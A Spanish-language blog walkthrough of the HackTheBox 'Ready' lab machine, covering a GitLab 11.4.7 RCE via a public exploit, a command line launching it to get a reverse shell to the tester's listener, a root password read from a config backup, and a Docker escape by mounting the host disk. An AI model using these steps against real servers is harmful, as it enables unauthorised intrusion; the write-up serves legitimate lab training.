---
layout: post
title:  "HackTheBox - Ready"
author: erik
categories: [ HTB ]
image: https://user-images.githubusercontent.com/47476901/155027150-bc1e52b6-053c-4aa6-87f6-5970850653de.png
beforetoc: ""
toc: false
tags: [ HTB, CVE, Linux ]
---
Maquina Linux nivel medio

# Table of Contents
1. [Enumeración](#enumeracion)
2. [Explotación](#explotacion)
3. [Escalación de Privilegios](#escalacion)

---

## Enumeración: <a name="enumeracion"></a>

**Puertos:**

- 22 SSH
- 5080 HTTP "GitLab"

### Gitlab

Para poder ingresar tuve que registrarme:
```http
http://10.10.10.220:5080/users/sign_in
```
![RegisterLogin](https://user-images.githubusercontent.com/47476901/119669294-3ca7ad80-be38-11eb-9974-73cae9331abc.png)



Mientras miraba Gitlab me di cuenta que tenia la version 11.4.7 y encontré un RCE que esta disponible.

![Searchsploit](https://user-images.githubusercontent.com/47476901/119669311-40d3cb00-be38-11eb-8ac5-df1bf27849cb.png)

## Explotación: <a name="explotacion"></a>

Este exploit nos crea un rce en un proyecto de gitlab que nos da una reverseshell al ejecutarlo.

- <a href="https://www.exploit-db.com/exploits/49334" target="_blank">Exploit Here</a>


```bash
python3 rce.py -u erik1 -p erik1234 -g http://10.10.10.220 -l 10.10.14.31 -P 1234
```

![ExploitRCE](https://user-images.githubusercontent.com/47476901/119669333-44675200-be38-11eb-957b-db84c295605a.png)

Este exploit nos crea un proyecto que nos ofrece una reverse shell, abrimos el proyecto para ejecutar la reverse.

Ponemos en escucha con el puerto indicado en el exploit:

![ReverseShell](https://user-images.githubusercontent.com/47476901/119669469-61038a00-be38-11eb-8de0-2c852d6f0959.png)

## Escalación de Privilegios: <a name="escalacion"></a>
La flag de user la podemos encontrar en  "/home/dude/user.txt".

![UserFlag](https://user-images.githubusercontent.com/47476901/119669485-64971100-be38-11eb-8089-4a9cbc8d0877.png)

En la ruta /opt/backups/gitlab.rb encontraremos un backup con la contraseña root del contenedor.

![FindPasswordRoot](https://user-images.githubusercontent.com/47476901/119681371-4c2bf400-be42-11eb-96da-72a78471ff0d.png)

Usamos la contraseña que hemos encontrado en el backup y accedemos a usuario root.

![LoginRoot](https://user-images.githubusercontent.com/47476901/119681390-4fbf7b00-be42-11eb-8746-3ce9e9af66a4.png)


Al estar dentro de un docker tendremos que intentar recopilar información fuera de el, para ello haremos lo siguiente:

Nos montamos la partición del host del contenedor para poder visualizarlo, allí encontraremos la flag:

![MountDocker](https://user-images.githubusercontent.com/47476901/119681411-55b55c00-be42-11eb-9035-b2cf24373cad.png)


![RootFlag](https://user-images.githubusercontent.com/47476901/119681425-5b12a680-be42-11eb-91ad-9c1584666773.png)


**Maquina Completada**
